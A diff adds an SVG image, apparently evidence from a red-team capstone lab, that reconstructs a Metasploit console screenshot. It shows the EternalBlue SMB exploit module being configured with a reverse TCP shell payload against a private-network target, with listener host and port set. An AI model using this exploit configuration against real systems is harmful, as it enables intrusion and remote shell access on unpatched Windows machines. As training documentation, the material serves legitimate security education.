@@ -1,0 +1,26 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="720" viewBox="0 0 1200 720" role="img" aria-labelledby="title desc">
+<title id="title">Red Team Capstone Metasploit evidence</title>
+<desc id="desc">Privacy-safe reconstruction of the supplied lab screenshot showing the EternalBlue Metasploit module and reverse TCP payload options.</desc>
+<rect width="1200" height="720" fill="#17263a"/>
+<rect x="0" y="0" width="1200" height="720" fill="#1f2e42"/>
+<g font-family="monospace" font-size="19" fill="#d5dce4">
+<text x="24" y="42">View the full module info with the info, or info -d command.</text>
+<text x="24" y="88" fill="#a5b2c2">msf6 exploit(</text><text x="170" y="88" fill="#a9ca61">windows/smb/ms17_010_eternalblue</text><text x="525" y="88" fill="#a5b2c2">) &gt; set payload windows/x64/shell/reverse_tcp</text>
+<text x="24" y="116">payload =&gt; windows/x64/shell/reverse_tcp</text>
+<text x="24" y="154" fill="#a5b2c2">msf6 exploit(</text><text x="170" y="154" fill="#a9ca61">windows/smb/ms17_010_eternalblue</text><text x="525" y="154" fill="#a5b2c2">) &gt; show options</text>
+<text x="24" y="205">Module options (exploit/windows/smb/ms17_010_eternalblue):</text>
+<text x="45" y="245" fill="#b8c5d2">Name</text><text x="235" y="245">Current Setting</text><text x="455" y="245">Required</text><text x="610" y="245">Description</text>
+<text x="45" y="283">RHOSTS</text><text x="235" y="283">10.64.139.231</text><text x="455" y="283">yes</text><text x="610" y="283">The target host(s)</text>
+<text x="45" y="318">RPORT</text><text x="235" y="318">445</text><text x="455" y="318">yes</text><text x="610" y="318">The target port (TCP)</text>
+<text x="45" y="353">SMBDomain</text><text x="455" y="353">no</text><text x="610" y="353">Optional Windows domain</text>
+<text x="45" y="388">SMBPass</text><text x="455" y="388">no</text><text x="610" y="388">Optional password</text>
+<text x="45" y="423">SMBUser</text><text x="455" y="423">no</text><text x="610" y="423">Optional username</text>
+<text x="45" y="458">VERIFY_ARCH</text><text x="235" y="458">true</text><text x="455" y="458">yes</text><text x="610" y="458">Check if remote architecture matches target</text>
+<text x="45" y="493">VERIFY_TARGET</text><text x="235" y="493">true</text><text x="455" y="493">yes</text><text x="610" y="493">Check if remote OS matches exploit target</text>
+<text x="24" y="552">Payload options (windows/x64/shell/reverse_tcp):</text>
+<text x="45" y="592" fill="#b8c5d2">Name</text><text x="235" y="592">Current Setting</text><text x="455" y="592">Required</text><text x="610" y="592">Description</text>
+<text x="45" y="627">EXITFUNC</text><text x="235" y="627">thread</text><text x="455" y="627">yes</text><text x="610" y="627">Exit technique</text>
+<text x="45" y="662">LHOST</text><text x="235" y="662">10.64.87.18</text><text x="455" y="662">yes</text><text x="610" y="662">The listen address</text>
+<text x="45" y="697">LPORT</text><text x="235" y="697">4444</text><text x="455" y="697">yes</text><text x="610" y="697">The listen port</text>
+</g>
+</svg>
